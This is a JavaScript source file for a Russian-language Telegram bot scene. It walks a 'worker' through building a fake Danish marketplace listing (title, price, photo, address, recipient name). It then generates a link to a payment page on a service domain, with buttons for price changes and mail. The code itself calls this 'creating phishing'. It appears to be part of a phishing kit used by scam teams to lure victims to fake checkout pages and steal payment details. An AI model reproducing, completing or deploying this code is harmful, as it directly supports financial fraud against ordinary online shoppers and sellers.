const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");

const { items, services, countries } = require("../../../../../database/index");

const parser = require("../../../../functions/createParser");
const getCurCode = require("../../../../functions/getCurCode");

function genId() {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  var charactersLength = characters.length;
  for (var i = 0; i < 8; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

module.exports = new WizardScene(
  "create_dba2_dk",
  async (ctx) => {
    try {
      ctx.wizard.state.service = ctx.match[1];

      await ctx
        .editMessageText("🇩🇰 <b>Выберите тип создания ссылки</b>", {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("🖊️ Ручной", "main"),
              Markup.callbackButton("🤖 Парсер", "parser"),
            ],
            [Markup.callbackButton("< Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.wizard.state.type = ctx.update.callback_query.data;

      if (ctx.update.callback_query.data == "main") {
        const msg = await ctx
          .editMessageText("🇩🇰 Введите название товара", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
      } else {
        await ctx
          .replyWithHTML("❗️ Парсер не доступен для этого сервиса", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< В меню", "menu")],
            ]),
          })
          .catch((err) => err);

        return ctx.scene.leave();
      }

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      if (ctx.wizard.state.type == "main") {
        ctx.wizard.state.title = ctx.message.text;

        const msg = await ctx
          .replyWithHTML("🇩🇰 Введите стоимость товара (только число)", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< Отменить", "cancel")],
            ]),
          })
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
        return ctx.wizard.next();
      }
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      ctx.wizard.state.price = parseFloat(ctx.message.text);

      if (isNaN(ctx.wizard.state.price)) {
        await ctx
          .replyWithHTML("❗️ Вы ввели не число, создание ссылки отменено", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< В меню", "menu")],
            ]),
          })
          .catch((err) => err);

        return ctx.scene.leave();
      } else {
        const msg = await ctx
          .replyWithHTML(
            "🇩🇰 Введите ссылку на изображение (используйте @UploadTelegraphBot)",
            {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("< Отменить", "cancel")],
              ]),
            }
          )
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
      }

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.wizard.state.photo = ctx.message.text;

      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      try {
        new URL(ctx.message.text);
      } catch (err) {
        await ctx
          .replyWithHTML(
            "❗️ Вы отправили не ссылку, создание фишинга отменено",
            {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("< В меню", "menu")],
              ]),
            }
          )
          .catch((err) => err);
        return ctx.scene.leave();
      }

      const msg = await ctx
        .replyWithHTML("🇩🇰 Введите адрес доставки", {
          reply_markup: Markup.inlineKeyboard([
            ...(ctx.state.user.address == null
              ? []
              : [[Markup.callbackButton(ctx.state.user.address, ctx.state.user.address)]]),
            [Markup.callbackButton("< Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);

      ctx.wizard.state.msgId = msg.message_id;

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.update.callback_query) {
        ctx.wizard.state.deliveryAddress = ctx.message.text;
        await ctx.state.user.update({
          address: ctx.message.text,
        });
      } else ctx.wizard.state.deliveryAddress = ctx.update.callback_query.data;

      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      const msg = await ctx
        .replyWithHTML("🇩🇰 Введи фамилию и имя получателя (Пример: Иванов Иван)", {
          reply_markup: Markup.inlineKeyboard([
            ...(ctx.state.user.name == null
              ? []
              : [[Markup.callbackButton(ctx.state.user.name, ctx.state.user.name)]]),
            [Markup.callbackButton("< Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);

      ctx.wizard.state.msgId = msg.message_id;

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.update.callback_query) {
        ctx.wizard.state.name = ctx.message.text;
        await ctx.state.user.update({
          name: ctx.message.text,
        });
      } else ctx.wizard.state.name = ctx.update.callback_query.data;

      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      const service = await services.findOne({
        where: {
          code: ctx.wizard.state.service,
        },
      });

      const item = await items.create({
        id: genId(),
        workerId: ctx.from.id,
        title: ctx.wizard.state.title,
        photo: ctx.wizard.state.photo,
        price: parseInt(ctx.wizard.state.price).toFixed(2),
        address: ctx.wizard.state.deliveryAddress,
        name: ctx.wizard.state.name,
        currency: service.currency,
        serviceCode: service.code,
        status: service.status,
      });

      const captionText = `<b>👻 Ссылка сгенерирована!
            
🏴 Сервис: ${service.title.replace(/[^a-zA-Z]+/g, "")} ${service.status}.0

▪️ ID объявления: #${item.id}
▪️ Название: ${ctx.wizard.state.title}
▪️ Стоимость: ${await getCurCode(service.currency)} ${parseInt(
        item.price
      ).toFixed(2)}</b>

✔️ Домен автоматически проверен.`;

      try {
        const msg = await ctx.replyWithPhoto(
          { url: ctx.wizard.state.photo },
          {
            caption: captionText,
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.urlButton(
                  "🔗 Перейти",
                  `https://${service.domain}/pay/order/${item.id}`
                ),
              ],
              [
                Markup.callbackButton("🖊️ Цена", `changePrice_${item.id}`),
                Markup.callbackButton("📪 Mail", `mail_${item.id}`),
              ],
              [Markup.callbackButton("< В меню", `menu`)],
            ]),
          }
        );
        await item.update({ msgId: msg.message_id });
      } catch (err) {
        // Fallback: отправляем только текст без фото
        const msg = await ctx.replyWithHTML(captionText, {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.urlButton(
                "🔗 Перейти",
                `https://${service.domain}/pay/order/${item.id}`
              ),
            ],
            [
              Markup.callbackButton("🖊️ Цена", `changePrice_${item.id}`),
              Markup.callbackButton("📪 Mail", `mail_${item.id}`),
            ],
            [Markup.callbackButton("< В меню", `menu`)],
          ]),
        });
        await item.update({ msgId: msg.message_id });
      }

      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  }
);
